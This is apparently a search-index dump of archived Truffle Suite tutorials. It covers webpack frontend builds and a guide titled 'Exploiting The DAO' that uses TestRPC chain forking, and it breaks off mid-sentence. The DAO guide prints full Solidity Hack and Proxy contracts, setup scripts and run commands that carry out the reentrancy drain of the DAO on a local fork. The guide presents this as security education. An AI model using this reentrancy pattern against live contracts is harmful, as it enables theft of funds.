Happy Truffling! Extra: Webpack + Docker + Travis CI \u00b6 If you want to see how to deploy a frontend app using Docker and Travis build pipeline, check out my frontend example for added goodness.","title":"Truffle Suite"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#intended-audience","text":"This is written for those familiar with Truffle and Ethereum, who want a sense of how to structure a frontend application for easy development and testing. This example uses webpack , but familiarity with other build tools is enough background.","title":"Intended audience"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#what-does-a-build-process-need-to-do-in-truffle","text":"In general, simple: Turn all higher level code (like ES6, SASS, JSX, templates, etc.) into vanilla JavaScript/HTML/CSS artifacts, and then move those artifacts into the build/ folder alongside our contract artifacts.","title":"What does a build process need to do in Truffle?"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#what-this-tutorial-does","text":"Uses webpack to compile the application's frontend code and move the artifacts into the build/ folder.","title":"What this tutorial does"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#getting-started","text":"Once you have Truffle installed, run truffle unbox webpack in an empty directory to pull down the Truffle Box for this tutorial. If you're familiar with the MetaCoin Truffle Box ), you'll notice your old friends Metacoin.sol and ConvertLib.sol are there. But now, running truffle build does this: Error building: No build configuration specified. Can ' t build. Build failed. See above. That's ok! Truffle is getting out of your way and letting you control the build process. Our new process is specified in webpack.config.js . More on this later.","title":"Getting started"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#compile-migrate-and","text":"In order to interact with contracts, we need them deployed on a network! The default network is configured in truffle.js : networks : { development : { host : '127.0.0.1' , port : 7545 , network_id : '*' // Match any network id } } This is the default setting for Ganache , though you can change this to use any connection you'd like. **Note**: Read more about [setting up Ganache](/docs/ganache/using). You can also use [Truffle Develop](/docs/getting_started/console), which launches a personal blockchain for testing and is built directly into Truffle, no separate installation required. Let's get the contracts on the network: First run truffle compile . This will compile the .sol contracts into .json artifacts (specified in the @truffle/contract library). They will appear in build/contracts/*.json . Now we can include contracts in our app with a simple import or require statement: // Import our contract artifacts and turn them into usable abstractions. import metacoin_artifacts from '../../build/contracts/MetaCoin.json' Next, make sure you have a blockchain running, and then run truffle migrate . This will deploy the contracts onto the default network running at 127.0.0.1:7545 .","title":"Compile, migrate, and ..."},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#webpack-build","text":"All that's left is to use webpack to compile the app and place it in the build/ folder. A simple npm run dev and we're done! This will build the app and serve it on http://127.0.0.1:8080 . Relevant configs here: // file: package.json ... \"scripts\" : { \"lint\" : \"eslint ./\" , \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server\" }, ... // file: webpack.config.js ... entry : './app/javascripts/app.js' , output : { path : path . resolve ( __dirname , 'build' ), filename : 'app.js' }, plugins : [ // Copy our app's index.html to the build folder. new CopyWebpackPlugin ([ { from : './app/index.html' , to : 'index.html' } ]) ], ... You can find more information on webpack concepts on webpack's website . Notice we didn't have to use webpack here, but Truffle comes with a handy webpack demo that gets us started quickly. We could replace the webpack config with a Gruntfile , for instance, and use Grunt instead. Truffle don't care no mo'.","title":"... (webpack) build"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#the-app","text":"As previously mentioned, the command npm run dev builds the app and serves it with a local web server. (This is equivalent to running npm run build and then truffle serve , but we've done it in one step for convenience.) To see it, navigate to http://127.0.0.1:8080 . You should see: That's it, all done! Happy Truffling!","title":"The app"},{"location":"guides/building-testing-frontend-app-truffle-3/index.html#extra-webpack-docker-travis-ci","text":"If you want to see how to deploy a frontend app using Docker and Travis build pipeline, check out my frontend example for added goodness.","title":"Extra: Webpack + Docker + Travis CI"},{"location":"guides/bundling-with-webpack/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Webpack is a powerful module bundler that helps turn your code into static assets you can deploy to the web. With the Truffle Solidity loader , we'll show you how you can use Webpack with your existing Truffle project. Intended Audience \u00b6 This tutorial is for Truffle users who are familiar with Webpack already. Since Webpack requires considerable knowledge to use effectively, we recommend checking out the Webpack documentation as well as the Truffle + Webpack Demo application before proceeding. Getting Started \u00b6 Navigate to your project in the command line, and then install the required dependencies. These dependencies are in addition to any other Webpack-related dependencies your project might have. $ npm install webpack webpack-dev-server truffle-solidity-loader --save-dev Set up Your Webpack Configuration \u00b6 You should already have a webpack configuration for your project. If you don't, an example configuration file is provided at the bottom of this tutorial. To enable Solidity support, add the truffle-solidity-loader as a plugin within your project: // your webpack configuration... module : { loaders : [ // ..., { test : /\\.sol/ , loader : 'truffle-solidity' } ] } Remove Default Build Configuration \u00b6 Since you're using Webpack to build your frontend, you won't want to use the default Truffle build process as the two processes will conflict. To ensure there are no issues if you or your teammates run truffle build , go ahead and delete the build configuration in your truffle.js file, if it exists. module . exports = { build : { // Delete this. // ... // and this. }, // and this too. rpc : { host : \"127.0.0.1\" , port : 8545 } } Bootstrapping Your Application \u00b6 Since you're bundling the frontend yourself and not using Truffle's default build process, certain \"magic\" provided by Truffle needs to be handled in order to get your application running properly. This includes: Detecting the web3 object provided to you by the user's Ethereum client, which as of this writing will likely be either Metamask or Mist . Provisioning your contract abstractions so they can communicate with your user's Ethereum client. Detecting Web3 \u00b6 In the past, Truffle bootstrapped applications to look for an open Ethereum node running at http://localhost:8545 , but this has proven to be insecure for the user as well as highly unlikely in a real world scenario. Instead, users are most likely to use Metamask or Mist to interact with web applications on the Ethereum network, and you should build your application to support that. Both Metamask and Mist inject a web3 object when the page is loading so you can hook into their transaction signing processes. Detecting this web3 object easy: var Web3 = require ( \"web3\" ); window . addEventListener ( 'load' , function () { // Supports Metamask and Mist, and other wallets that provide 'web3'. if ( typeof web3 !== 'undefined' ) { // Use the Mist/wallet provider. window . web3 = new Web3 ( web3 . currentProvider ); } else { // No web3 detected. Show an error to the user or use Infura: https://infura.io/ } }); Notice we only use the wallet's provider and not the whole web3 object provided to us. This ensures our application is not dependent on the wallet's version of Web3, and reduces the surface area in which version errors might occur. Provisioning Your Contract Abstractions \u00b6 Provisioning your contract abstractions requires two things: 1) that you include your contracts in your project, and 2) that you set up the Javascript abstractions so that they're correctly talking to the Ethereum client via Web3. When including contracts in your application, the Solidity Loader will resolve all .sol files to their associated contract abstraction, so importing your contracts is simply a matter of performing one of the following within your frontend: // ES5: var MyContract = require ( \"contracts/MyContract.sol\" ); // ES6: import MyContract from \"contracts/MyContract.sol\" ; After making sure your contract is imported, you now need to hook up the web3 object you detected above with the contract abstraction provided: MyContract . setProvider ( window . web3 . currentProvider ); Finally, you can use the contract abstraction as described within the Truffle documentation . You can prevent having to perform this provisioning more than once per contract dependency by either setting your contract abstractions to the global object, like window , and provisioning them once when your application loads; or using something like the ProvidePlugin to ensure your contract abstractions are available to every file within the bundle (recommended). Running Webpack \u00b6 From here you can run webpack like normal, via the normal webpack command or the webpack-dev-server , if you have those installed globally on your machine: $ webpack $ webpack-dev-server --hot Alternatively, you can edit your project's package.json file to run Wepback from the versions you installed at the beginning of this tutorial: \"scripts\" : { \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server --hot\" } Example Webpack Config \u00b6 Here's a very simple Webpack configuration file that uses the Truffle Solidity Loader as well as other plugins. This configration file exists within a React application where its source files exist within the ./app directory, and CSS is pulled out using the copy-webpack-plugin . Of course, your dapp's layout and structure will be different, but this should give you a good example of how the Solidity Loader fits within a simple application. var webpack = require ( \"webpack\" ); var CopyWebpackPlugin = require ( 'copy-webpack-plugin' ); var ExtractTextPlugin = require ( \"extract-text-webpack-plugin\" ); module . exports = { entry : './app/javascripts/app.jsx' , output : { path : \"./build\" , filename : 'app.js' }, module : { loaders : [ { test : /\\.(js|jsx|es6)$/ , exclude : /node_modules/ , loader : \"babel-loader\" }, { test : /\\.scss$/i , loader : ExtractTextPlugin . extract ([ \"css\" , \"sass\" ])}, { test : /\\.json$/i , loader : \"json-loader\" }, { test : /\\.sol/ , loader : 'truffle-solidity' } ] }, plugins : [ new CopyWebpackPlugin ([ { from : './app/index.html' , to : \"index.html\" }, { from : './app/images' , to : \"images\" }, { from : './app/fonts' , to : \"fonts\" } ]), new ExtractTextPlugin ( \"app.css\" ) ], devServer : { stats : 'errors-only' , } };","title":"Truffle Suite"},{"location":"guides/bundling-with-webpack/index.html#intended-audience","text":"This tutorial is for Truffle users who are familiar with Webpack already. Since Webpack requires considerable knowledge to use effectively, we recommend checking out the Webpack documentation as well as the Truffle + Webpack Demo application before proceeding.","title":"Intended Audience"},{"location":"guides/bundling-with-webpack/index.html#getting-started","text":"Navigate to your project in the command line, and then install the required dependencies. These dependencies are in addition to any other Webpack-related dependencies your project might have. $ npm install webpack webpack-dev-server truffle-solidity-loader --save-dev","title":"Getting Started"},{"location":"guides/bundling-with-webpack/index.html#set-up-your-webpack-configuration","text":"You should already have a webpack configuration for your project. If you don't, an example configuration file is provided at the bottom of this tutorial. To enable Solidity support, add the truffle-solidity-loader as a plugin within your project: // your webpack configuration... module : { loaders : [ // ..., { test : /\\.sol/ , loader : 'truffle-solidity' } ] }","title":"Set up Your Webpack Configuration"},{"location":"guides/bundling-with-webpack/index.html#remove-default-build-configuration","text":"Since you're using Webpack to build your frontend, you won't want to use the default Truffle build process as the two processes will conflict. To ensure there are no issues if you or your teammates run truffle build , go ahead and delete the build configuration in your truffle.js file, if it exists. module . exports = { build : { // Delete this. // ... // and this. }, // and this too. rpc : { host : \"127.0.0.1\" , port : 8545 } }","title":"Remove Default Build Configuration"},{"location":"guides/bundling-with-webpack/index.html#bootstrapping-your-application","text":"Since you're bundling the frontend yourself and not using Truffle's default build process, certain \"magic\" provided by Truffle needs to be handled in order to get your application running properly. This includes: Detecting the web3 object provided to you by the user's Ethereum client, which as of this writing will likely be either Metamask or Mist . Provisioning your contract abstractions so they can communicate with your user's Ethereum client.","title":"Bootstrapping Your Application"},{"location":"guides/bundling-with-webpack/index.html#detecting-web3","text":"In the past, Truffle bootstrapped applications to look for an open Ethereum node running at http://localhost:8545 , but this has proven to be insecure for the user as well as highly unlikely in a real world scenario. Instead, users are most likely to use Metamask or Mist to interact with web applications on the Ethereum network, and you should build your application to support that. Both Metamask and Mist inject a web3 object when the page is loading so you can hook into their transaction signing processes. Detecting this web3 object easy: var Web3 = require ( \"web3\" ); window . addEventListener ( 'load' , function () { // Supports Metamask and Mist, and other wallets that provide 'web3'. if ( typeof web3 !== 'undefined' ) { // Use the Mist/wallet provider. window . web3 = new Web3 ( web3 . currentProvider ); } else { // No web3 detected. Show an error to the user or use Infura: https://infura.io/ } }); Notice we only use the wallet's provider and not the whole web3 object provided to us. This ensures our application is not dependent on the wallet's version of Web3, and reduces the surface area in which version errors might occur.","title":"Detecting Web3"},{"location":"guides/bundling-with-webpack/index.html#provisioning-your-contract-abstractions","text":"Provisioning your contract abstractions requires two things: 1) that you include your contracts in your project, and 2) that you set up the Javascript abstractions so that they're correctly talking to the Ethereum client via Web3. When including contracts in your application, the Solidity Loader will resolve all .sol files to their associated contract abstraction, so importing your contracts is simply a matter of performing one of the following within your frontend: // ES5: var MyContract = require ( \"contracts/MyContract.sol\" ); // ES6: import MyContract from \"contracts/MyContract.sol\" ; After making sure your contract is imported, you now need to hook up the web3 object you detected above with the contract abstraction provided: MyContract . setProvider ( window . web3 . currentProvider ); Finally, you can use the contract abstraction as described within the Truffle documentation . You can prevent having to perform this provisioning more than once per contract dependency by either setting your contract abstractions to the global object, like window , and provisioning them once when your application loads; or using something like the ProvidePlugin to ensure your contract abstractions are available to every file within the bundle (recommended).","title":"Provisioning Your Contract Abstractions"},{"location":"guides/bundling-with-webpack/index.html#running-webpack","text":"From here you can run webpack like normal, via the normal webpack command or the webpack-dev-server , if you have those installed globally on your machine: $ webpack $ webpack-dev-server --hot Alternatively, you can edit your project's package.json file to run Wepback from the versions you installed at the beginning of this tutorial: \"scripts\" : { \"build\" : \"webpack\" , \"dev\" : \"webpack-dev-server --hot\" }","title":"Running Webpack"},{"location":"guides/bundling-with-webpack/index.html#example-webpack-config","text":"Here's a very simple Webpack configuration file that uses the Truffle Solidity Loader as well as other plugins. This configration file exists within a React application where its source files exist within the ./app directory, and CSS is pulled out using the copy-webpack-plugin . Of course, your dapp's layout and structure will be different, but this should give you a good example of how the Solidity Loader fits within a simple application. var webpack = require ( \"webpack\" ); var CopyWebpackPlugin = require ( 'copy-webpack-plugin' ); var ExtractTextPlugin = require ( \"extract-text-webpack-plugin\" ); module . exports = { entry : './app/javascripts/app.jsx' , output : { path : \"./build\" , filename : 'app.js' }, module : { loaders : [ { test : /\\.(js|jsx|es6)$/ , exclude : /node_modules/ , loader : \"babel-loader\" }, { test : /\\.scss$/i , loader : ExtractTextPlugin . extract ([ \"css\" , \"sass\" ])}, { test : /\\.json$/i , loader : \"json-loader\" }, { test : /\\.sol/ , loader : 'truffle-solidity' } ] }, plugins : [ new CopyWebpackPlugin ([ { from : './app/index.html' , to : \"index.html\" }, { from : './app/images' , to : \"images\" }, { from : './app/fonts' , to : \"fonts\" } ]), new ExtractTextPlugin ( \"app.css\" ) ], devServer : { stats : 'errors-only' , } };","title":"Example Webpack Config"},{"location":"guides/chain-forking-exploiting-the-dao/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation Since The DAO was exploited , the Ethereum community has swarmed into action. From hardening our most popular language with the latest Solidity release to visualizing possible security vulnerabilities with SolGraph , the community has made security its number one focus. There are many ways in which to discover security threats, and most were discussed during Devcon 2 in Shanghai. The ethereumjs-testrpc authors have focused on one specifically, which we'll discuss here, called dynamic analysis through chain forking. What is Dynamic Analysis? \u00b6 Dynamic Analysis is the process of executing code and data in real-time with the hope of finding issues during execution. It's a similar process to exploratory testing , with the same goals, but perhaps more technical. Dynamic analysis on the Ethereum blockchain has historically been costly at worst and tedious at best. If you were to perform dynamic analysis on the live Ethereum chain, transactions would cost you hard-earned Ether, which might limit the tests you perform. Moving away from the live chain is possible, but it's a tedious process to move the live data over to a separate chain, and you'd have to perform this process multiple times if you end up mucking with the chain state during testing. Hello, TestRPC \u00b6 In early September, ethereumjs-testrpc released its --fork feature meant to solve the issues with dynamic analysis on the live chain (or any chain, for that matter). It did so by allowing you to \"fork\" from the live chain -- i.e., create a new blockchain that starts from the last block on the existing chain -- allowing you to make transactions on the new chain without spending real Ether or changing the existing chain's state. What's more, you can reset the chain back to its original state by simply restarting the TestRPC. This feature has big implications for many other areas of development, but today we'll talk about how we can use it for dynamic analysis. Exploiting The DAO \u00b6 One great feature of the TestRPC is that it's scriptable. Although this tutorial will show you how we exploited it, with the TestRPC's new --fork feature all you have to do is download the code and exploit it yourself, simply by running one command! You can find the full exploit code as a Truffle project here , and the original demo video below. Overview of the exploit \u00b6 The DAO exploit has many steps, and many of those steps are simply waiting for time to move forward. Here's a general overview of the steps we'll perform: Fork from the live chain at a block just before the DAO presale ended. We fork at this point in time to have as much Ether as we can to exploit (for example's sake). Participate in the presale by buying DAO tokens. Wait one day for the presale to end. Deploy our Hack contract to the network that we will eventually use to exploit the DAO. Transfer the DAO tokens we purchased to the hack contract. Have our DAO contract make a split proposal, which is required to perform the exploit. Vote yes on our own proposal (someone has to). Wait a week for our proposal voting time to end (we end up waiting eight days for good measure). Perform our split, which starts the hack. Then continue it in a loop! Aside: Traveling through time \u00b6 In the above overview, there are a few steps that require us to wait days to complete. Don't worry: the TestRPC has features that allow us to jump forward in time, so waiting days for a single step will take mere milliseconds. Bon voyage! Step 1: Forking from the main chain \u00b6 This step requires you to sync the live chain using go-ethereum or any other Ethereum client . Because we'll be forking from a previous state, you must sync the whole chain ; you can't use the --fast option (or similar) to only sync the latest state. To keep this tutorial as succinct as possible, we'll leave syncing the chain up to you as the steps vary widely based on the client chosen and the environment where it's intended to be installed. Once you have your client running, ensure it has an open RPC API running and available to you. For this example, we'll assume you have your client accepting requests on http://127.0.0.1:8545 , the default for most clients. To fork from the live chain, we first need to run an instance of the TestRPC, pointing it at the correct host and port. Remember: We're creating a programmable script that exploits The DAO, so you'll first need to install the required dependencies and include them within the script. We won't be writing the whole script here, but you can follow along via the script on github . var web3 = new Web3 ( TestRPC . provider ({ fork : \"http://127.0.0.1:8545@1599200\" })); Here, we create a new instance of the TestRPC, forking from a chain which accepts requests from http://127.0.0.1:8545 (our live chain). As well, we tell it that we want to fork from block 1599200 ; this is a block that was mined right before the DAO presale ended. Step 2: Participate in the presale \u00b6 Participating in the presale is just a matter of sending Ether to the DAO contract. We can use a normal transaction to do this. Below, we buy 90 ETH worth of DAO tokens: var DAO = DAOContract . at ( \"0xbb9bc244d798123fde783fcc1c72d3bb8c189413\" ); web3 . eth . sendTransaction ({ from : accounts [ 0 ], to : DAO . address , value : web3 . toWei ( 90 , \"Ether\" ), gas : 90000 }, callback ); Note that the accounts array is populated by our script, which used web3.eth.getAccounts() to get a list of all available accounts provided to us by the TestRPC. As well, we've pointed an instance of the DAO contract to the address 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 , which is the original DAO account and code. Again, for example's sake we're using some shorthand, so please follow along with the script on github . Step 3: Wait for the presale to end \u00b6 Since we forked to a block that was mined the day before the presale ended, we have to jump forward in time by at least a few hours to get past the presale deadline. We decided to jump a day by calling a special method provided by the TestRPC, evm_increaseTime : web3 . currentProvider . sendAsync ({ jsonrpc : \"2.0\" , method : \"evm_increaseTime\" , params : [ 86400 ], // 86400 seconds in a day id : new Date (). getTime () }, callback ); This will tell the TestRPC to alter its timestamp by 86400 seconds. This feature allows you to write tests that have a time component, and in our case allows us to continue executing code after a deadline is reached. Step 4: Deploy our hack contract to the network \u00b6 This hack contract was written by me, but it was heavily influenced by this writeup written by Phil Daian from Hacking, Distributed . Many thanks go to him for such a clear writeup. From Github: ./contracts/Hack.sol import \"DAOInterface.sol\" ; contract Proxy { DAOInterface DAO ; address owner ; function Proxy ( address _dao ) { owner = msg.sender ; DAO = DAOInterface ( _dao ); } function empty () { if ( msg.sender != owner ) return ; uint balance = DAO . balanceOf ( this ); DAO . transfer ( owner , balance ); } } contract Hack { uint public proposalID ; DAOInterface public DAO ; uint public calls_to_make ; uint public calls ; Proxy public proxy ; function Hack ( address _dao ) { DAO = DAOInterface ( _dao ); calls = 0 ; proxy = new Proxy ( _dao ); calls_to_make = 1 ; } function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } function voteYesOnProposal () { DAO . vote ( proposalID , true ); } function fillProxy () { uint balance = DAO . balanceOf ( this ); DAO . transfer ( address ( proxy ), balance ); } function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } } First, this contract file contains two contracts: A Proxy contract, and a Hack contract. The Hack contract performs the splits, and is the main entity and address that exploits the DAO. The Proxy contract is a place for the Hack contract to stash its DAO tokens before they get flushed at the end of one run through the loop. Because they're stashed in a different address, the final iteration will have no DAO tokens to zero out, and thus we can continue the hack indefinitely. makeSplitProposal() , voteYesOnProposal() , and splitDAO() (when called on its own), are all functions required to set up the hack. Since the Hack contract is the main entity that holds the DAO tokens, it must perform this setup in order to execute the hack later. fillProxy() takes the Hack contract's DAO tokens and transfers them to the address of the Proxy contract, a vital part of making the hack indefinite. As well, proxy.empty() returns the tokens back to the Hack contract. runHack() gets the hack started, and the fallback function function() {...} runs the hack until we've reached the maximum amount of calls we can make within our given gas limit. Step 5: Transfer DAO tokens to Hack contract \u00b6 Now that our Hack contract is deployed, we need to transfer the DAO balance from accounts[0] to our Hack contract so that it can exploit the hack. We do this by using our contract abstraction provided by Truffle: DAO . transfer ( Hack . address , balances . accountDAO , { from : accounts [ 0 ]}). then ( function () { callback (); }). catch ( callback ); Step 6: Make a split proposal \u00b6 Making a split proposal is part of the DAO. A split proposal is a suggestion to all other DAO token holders that you should remove your Ether from the main DAO and create a DAO all your own. You can vote on this proposal to ensure it goes through, and after seven days if the split is approved by a majority of voters, you'll be able to move your Ether into your own DAO. I found creating a split proposal rather confusing. Creating a split is similar to creating a normal proposal, but it requires much less data as input to the DAO's newProposal() function. Still, you must satisfy every input, and it took trial and error to figure out exactly what inputs would do the trick. I used a number of resources, including this wiki page , this wiki page , this wiki page as well as the DAO code itself (to future developers, I'd highly recommend encapsulating the complexity if you have two \"things\" of the same general type where one is far simpler than the other). Eventually I was able to find the right combination, and I put it in its own method in the Hack contract above. Now, creating my proposal was simply a matter of calling that single function: function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } Couple points here: The first input is the recipient of the proposal -- or in our case, the curator of the new DAO that's created -- which is the Hack contract itself. 0x0 is the amount of Ether to send with the proposal. We're told to leave this blank when creating a split, which means to leave it zero if calling the function programmatically. \"Lonely, so Lonely\" is a short description of the proposal. This is the same description the original attacker used, so it's only fitting to use it ourselves as well. transactionData is any extra input used to call functions on the proposal's contract were this a real proposal. Since this is a split we're supposed to leave it blank, but the only way to do so is to create a new bytes type in memory and pass that empty type along. 0x93a80 is one week in seconds, converted to hexadecimal. true means we're actually splitting, and not creating a normal proposal. When I executed the above function from Javascript I also watched for the ProposalAdded event fired off by the DAO, which told me the id of the proposal created. You can see how I did that in the script . Step 7: Vote yes on the proposal \u00b6 This is a simple function call. Like the makeSplitProposal() function above, the voteYesOnProposal() function was added to the Hack contract to ensure the Hack contract was the entity voting yes. Since it's encapsulated in the Hack contract, it's as simple as calling a single function from Javascript. We need only pass along the proposal id and our vote to ensure our vote is counted: function voteYesOnProposal () { DAO . vote ( proposalID , true ); } Step 8: Wait a week \u00b6 The minimum waiting period for a split proposal is one week. Since we created our proposal above with a waiting period of a week, we need to tell the TestRPC to jump forward that much time (in seconds). I'll leave that as an exercise for the reader, or you can just review the script . Step 9: Perform our first split \u00b6 The hack itself is a continuous stream of split requests, however for our script we start by splitting the DAO once ourselves. We do this mostly for the purposes of the script so we can get the newly created DAO's address that we can later use to show our total bounty. We've set up the hack contract to only make one split the first time we call splitDAO() (see calls and calls_to_make ; calls_to_make defaulted to 1 when we deployed the contract). We need to enforce the amount of splits we intend to make because otherwise we'd trigger the hack by continuing to make splits from the fallback function. function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } Like when we created a proposal we also wait for an event here, this time the Transfer event, but again you can see how we did that within the script . Step 10: Run the hack \u00b6 This is where things get interesting. We performed a significant setup in order to get to this point. Fortunately, all logic of the hack is contained within the Hack and Proxy contracts. function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } The execution logic looks like this: Call runHack() to start the hack. Here, we pass in the specific number of splits we want to execute to ensure we don't go over the gas limit. The Proxy contract is then emptied of all its DAO tokens, transferring them back to the Hack contract so they can be used to run the hack. Next, the splitDAO() function is called, eventually calling DAO.splitDAO() , which during execution attempts to give any reward from the split to the recipient of the proposal, our Hack contract. The reward in our case is zero, but it's the action of sending the reward -- _recipient.call.value(_amount)() in ManagedAccount.sol -- that enables us to perform the rest of the hack. Sending the reward to the Hack contract triggers the Hack contract's fallback function. Here, the fallback function tracks how many splits it has made, and if it hasn't made too many, it then calls another split via the splitDAO() function. If it has called the expected amount of splits, it then sends the DAO tokens back to the Proxy contract before the main DAO can record the Hack contract's balance as zero. The execution will loop in this way -- split, fallback function, split, fallback function -- until the preset number of splits have been made. The transaction then exits, is recorded as successful on the blockchain, and is run continuously by our script until the DAO is drained of all its Ether. You can see via the script where the balance goes. After each set of iterations -- in our case, 26 iterations per set -- you can see that Ether funnels from the old DAO to the new DAO and the DAO tokens that allowed us to perform the hack wind up back in the Proxy contract where they started. This is one of the amazing properties of this hack, in that you can run it indefinitely with the same DAO tokens you started with. Again, big thanks to the fine folks at Hacking, Distributed for this revelation . Running the script \u00b6 As mentioned in step 1, you first need to have a running Ethereum client synced to the live chain. Second, you need to download the code and install all the dependencies: $ git clone https://github.com/tcoulter/dao-truffle $ cd dao-truffle $ npm install Afterward, you need to have Truffle compile all the contracts for you so that their binaries and ABI interfaces will be available. First install Truffle then run: $ truffle compile From here, you can run the script by simply running: $ node index.js And now you've exploited the DAO. Cheers! But, Dynamic Analysis? \u00b6 Of course you might be asking, \"How does this apply to dynamic analysis? You've only shown me how to exploit the DAO!\" Yes, that's true, but dynamic analysis was the trojan horse. Because this hack can be made better , to the point where you can perform more iterations out of a single transaction and suck more ETH out of the DAO faster than the script I've provided you. You've been given all the tools and tricks you need, including chain forking which allows you to perform dynamic analysis for free. Given that, do you think you can you figure it out? As a hint, it may be helpful at times to interact with the TestRPC from the console rather than through code. You can run the TestRPC via the command line, like so... $ testrpc --fork http://127.0.0.1:8545@1599200 ... and then use Truffle's console to interact with the DAO directly: $ truffle console Good luck, and may all your code be secure!","title":"Truffle Suite"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#what-is-dynamic-analysis","text":"Dynamic Analysis is the process of executing code and data in real-time with the hope of finding issues during execution. It's a similar process to exploratory testing , with the same goals, but perhaps more technical. Dynamic analysis on the Ethereum blockchain has historically been costly at worst and tedious at best. If you were to perform dynamic analysis on the live Ethereum chain, transactions would cost you hard-earned Ether, which might limit the tests you perform. Moving away from the live chain is possible, but it's a tedious process to move the live data over to a separate chain, and you'd have to perform this process multiple times if you end up mucking with the chain state during testing.","title":"What is Dynamic Analysis?"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#hello-testrpc","text":"In early September, ethereumjs-testrpc released its --fork feature meant to solve the issues with dynamic analysis on the live chain (or any chain, for that matter). It did so by allowing you to \"fork\" from the live chain -- i.e., create a new blockchain that starts from the last block on the existing chain -- allowing you to make transactions on the new chain without spending real Ether or changing the existing chain's state. What's more, you can reset the chain back to its original state by simply restarting the TestRPC. This feature has big implications for many other areas of development, but today we'll talk about how we can use it for dynamic analysis.","title":"Hello, TestRPC"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#exploiting-the-dao","text":"One great feature of the TestRPC is that it's scriptable. Although this tutorial will show you how we exploited it, with the TestRPC's new --fork feature all you have to do is download the code and exploit it yourself, simply by running one command! You can find the full exploit code as a Truffle project here , and the original demo video below.","title":"Exploiting The DAO"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#overview-of-the-exploit","text":"The DAO exploit has many steps, and many of those steps are simply waiting for time to move forward. Here's a general overview of the steps we'll perform: Fork from the live chain at a block just before the DAO presale ended. We fork at this point in time to have as much Ether as we can to exploit (for example's sake). Participate in the presale by buying DAO tokens. Wait one day for the presale to end. Deploy our Hack contract to the network that we will eventually use to exploit the DAO. Transfer the DAO tokens we purchased to the hack contract. Have our DAO contract make a split proposal, which is required to perform the exploit. Vote yes on our own proposal (someone has to). Wait a week for our proposal voting time to end (we end up waiting eight days for good measure). Perform our split, which starts the hack. Then continue it in a loop!","title":"Overview of the exploit"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#aside-traveling-through-time","text":"In the above overview, there are a few steps that require us to wait days to complete. Don't worry: the TestRPC has features that allow us to jump forward in time, so waiting days for a single step will take mere milliseconds. Bon voyage!","title":"Aside: Traveling through time"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-1-forking-from-the-main-chain","text":"This step requires you to sync the live chain using go-ethereum or any other Ethereum client . Because we'll be forking from a previous state, you must sync the whole chain ; you can't use the --fast option (or similar) to only sync the latest state. To keep this tutorial as succinct as possible, we'll leave syncing the chain up to you as the steps vary widely based on the client chosen and the environment where it's intended to be installed. Once you have your client running, ensure it has an open RPC API running and available to you. For this example, we'll assume you have your client accepting requests on http://127.0.0.1:8545 , the default for most clients. To fork from the live chain, we first need to run an instance of the TestRPC, pointing it at the correct host and port. Remember: We're creating a programmable script that exploits The DAO, so you'll first need to install the required dependencies and include them within the script. We won't be writing the whole script here, but you can follow along via the script on github . var web3 = new Web3 ( TestRPC . provider ({ fork : \"http://127.0.0.1:8545@1599200\" })); Here, we create a new instance of the TestRPC, forking from a chain which accepts requests from http://127.0.0.1:8545 (our live chain). As well, we tell it that we want to fork from block 1599200 ; this is a block that was mined right before the DAO presale ended.","title":"Step 1: Forking from the main chain"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-2-participate-in-the-presale","text":"Participating in the presale is just a matter of sending Ether to the DAO contract. We can use a normal transaction to do this. Below, we buy 90 ETH worth of DAO tokens: var DAO = DAOContract . at ( \"0xbb9bc244d798123fde783fcc1c72d3bb8c189413\" ); web3 . eth . sendTransaction ({ from : accounts [ 0 ], to : DAO . address , value : web3 . toWei ( 90 , \"Ether\" ), gas : 90000 }, callback ); Note that the accounts array is populated by our script, which used web3.eth.getAccounts() to get a list of all available accounts provided to us by the TestRPC. As well, we've pointed an instance of the DAO contract to the address 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 , which is the original DAO account and code. Again, for example's sake we're using some shorthand, so please follow along with the script on github .","title":"Step 2: Participate in the presale"},{"location":"guides/chain-forking-exploiting-the-dao/index.html#step-3-wait-for-the-presale-to-end","text":"Since we forked to a block that was mined the day before the presale ended, we have to jump forward in time by at least a few hours to get past the presale deadline. We decided to jump a day by calling a special method provided by the TestRPC, evm_increaseTime : web3 . currentProvider . sendAsync ({ jsonrpc : \"2.0\" , method : \"evm_increaseTime\" , params : [ 86400 ], // 86400 seconds in a day id : new Date (). getTime () }, callback ); This will tell the TestRPC to 